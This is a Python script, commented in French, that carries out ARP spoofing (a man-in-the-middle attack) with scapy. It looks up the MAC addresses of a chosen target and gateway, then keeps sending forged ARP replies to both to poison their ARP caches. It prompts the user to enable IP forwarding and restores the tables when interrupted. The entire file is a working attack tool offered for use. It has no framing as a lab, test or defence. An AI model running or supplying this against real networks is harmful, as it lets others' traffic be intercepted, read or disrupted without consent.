import scapy.all as scapy
import time
import argparse
import sys
import os
def get_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Outil d'ARP Spoofing (MITM)")
    parser.add_argument("-t", "--target", dest="target", help="IP de la cible", required=True)
    parser.add_argument("-g", "--gateway", dest="gateway", help="IP de la passerelle", required=True)
    return parser.parse_args()

def check_privileges():
    """Vérifie si le script est exécuté avec les privilèges nécessaires."""
    # Sur Windows, scapy gère souvent cela, mais sur Linux/Unix, le check UID est standard
    if os.name != 'nt':
        if os.geteuid() != 0:
            print("[-] Erreur : Ce script nécessite des privilèges root (sudo).")
            sys.exit(1)

def get_mac(ip: str) -> str:
    """Envoie une requête ARP pour obtenir l'adresse MAC d'une IP donnée."""
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    if answered_list:
        return answered_list[0][1].hwsrc
    else:
        print(f"[-] Impossible de trouver l'adresse MAC pour {ip}. Vérifiez si l'hôte est en ligne.")
        sys.exit()

def spoof(target_ip: str, target_mac: str, spoof_ip: str):
    """Envoie un paquet ARP falsifié pour faire croire que nous sommes l'IP spoofée."""
    # op=2 indique une réponse ARP (is-at)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip: str, destination_mac: str, source_ip: str, source_mac: str):
    """Rétablit les tables ARP d'origine."""
    # On renvoie les vraies adresses MAC pour réparer le réseau
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

def main():
    args = get_args()
    check_privileges()

    target_ip = args.target
    gateway_ip = args.gateway

    # Obtenir les adresses MAC une seule fois au début pour optimiser les performances
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)

    try:
        sent_packets_count = 0
        print(f"[+] Démarrage de l'attaque sur {target_ip}...")
        print("[!] N'oubliez pas d'activer l'IP Forwarding !")
        
        while True:
            # On ment à la cible : "Je suis le routeur"
            spoof(target_ip, target_mac, gateway_ip)
            # On ment au routeur : "Je suis la cible"
            spoof(gateway_ip, gateway_mac, target_ip)
            
            sent_packets_count += 2
            # \r permet d'écraser la ligne précédente pour un affichage dynamique
            print(f"\r[+] Paquets envoyés : {sent_packets_count}", end="")
            time.sleep(2)
            
    except KeyboardInterrupt:
        print("\n[!] Interruption détectée... Rétablissement du réseau. Veuillez patienter.")
        restore(target_ip, target_mac, gateway_ip, gateway_mac)
        restore(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[+] Tables ARP restaurées. Fin du script.")

if __name__ == "__main__":
    main()